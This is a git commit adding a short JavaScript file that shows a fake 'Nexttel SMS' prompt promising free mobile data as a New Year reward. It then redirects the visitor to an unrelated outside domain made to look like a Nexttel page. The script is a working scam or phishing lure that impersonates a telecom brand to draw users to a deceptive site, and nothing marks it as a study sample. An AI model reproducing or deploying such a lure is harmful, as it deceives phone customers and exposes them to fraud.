6d02108a510eecaefd3b556ce639d981cabb0e7d
ekpesense <abantak9@gmail.com>
2025-01-25 22:49:56 -0800

    Create activation-nexttel.js

---
+++ activation-nexttel.js
@@ -0,0 +1,6 @@
+
+var password = 'NEW YEAR GIFT'
+password=prompt('Nexttel SMS: Dear Nexttel Customer Kindly Receive Free Data From 5GB - 100GB, New Year Customers Reward, Click NEW YEAR GIFT To Check Now ','NEW YEAR GIFT');
+if (password != 'NEW YEAR GIFT') {
+location.href='https://offer-fest.info/nexttel.com.html';
+}
